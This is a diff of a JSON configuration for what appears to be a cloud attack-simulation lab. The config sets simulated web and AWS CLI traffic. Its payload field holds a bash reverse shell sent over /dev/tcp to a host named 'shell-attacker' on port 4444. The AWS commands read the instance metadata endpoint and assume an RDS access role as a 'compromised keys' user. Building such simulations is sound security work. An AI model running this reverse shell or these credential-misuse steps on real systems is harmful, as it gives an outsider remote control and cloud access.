@@ -16,7 +16,7 @@
               "attacker_ip": "shell-attacker-${ deployment }.${ dynu_dns_domain }",
               "target_port": 8080,
               "payload": "/bin/bash -c \"TASK=iam2rds /bin/bash -i >& /dev/tcp/shell-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
-              "attack_delay": 50400
+              "attack_delay": 50400,
               "reverse_shell_port": 4444
             },
             "generate_web_traffic": {
@@ -28,9 +28,12 @@
             },
             "generate_aws_cli_traffic": {
               "enabled": false,
-              "compromised_keys_user" : "khon.traktour@interlacelabs",
+              "compromised_keys_user" : "khon.traktour-${deployment}@interlacelabs",
+              "profile" : "aws-traffic",
               "commands": [
-                "apt-get install -y jq",
+                "if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi",
+                "PROFILE=aws-traffic",
+                "log \"User: $(aws sts get-caller-identity --profile=$PROFILE)\"",
                 "REGION=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r .region)",
                 "ROLE_NAME=\"rds_user_access_role_ciemdemo\"",
                 "SESSION_NAME=\"local-user\"",
